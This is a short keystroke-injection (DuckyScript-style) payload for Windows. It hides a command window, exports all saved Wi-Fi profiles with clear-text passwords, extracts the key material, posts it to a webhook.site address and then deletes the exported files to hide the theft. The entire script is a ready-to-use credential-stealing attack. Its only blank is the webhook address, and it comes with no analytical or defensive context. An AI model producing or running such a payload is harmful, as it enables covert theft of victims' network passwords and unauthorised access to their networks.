DELAY 2000
GUI r 
DELAY 500
STRING cmd /k mode con: cols=15 lines=1
DELAY 400 
ENTER
DELAY 200
STRING cd %temp%
DELAY 150
ENTER
DELAY 100 
STRING netsh wlan export profile key=clear
DELAY 1000
ENTER
DELAY 200 
STRING powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
DELAY 1000 
ENTER
DELAY 500
STRING powershell Invoke-WebRequest -Uri https://webhook.site/<ADD-WEBHOOK-ADDRESS-HERE> -Method POST -InFile Wi-Fi-PASS
DELAY 500 
ENTER
DELAY 600 
STRING del Wi-* /s /f /q
DELAY 200 
ENTER
DELAY 400 
STRING EXIT 
DELAY 250
ENTER
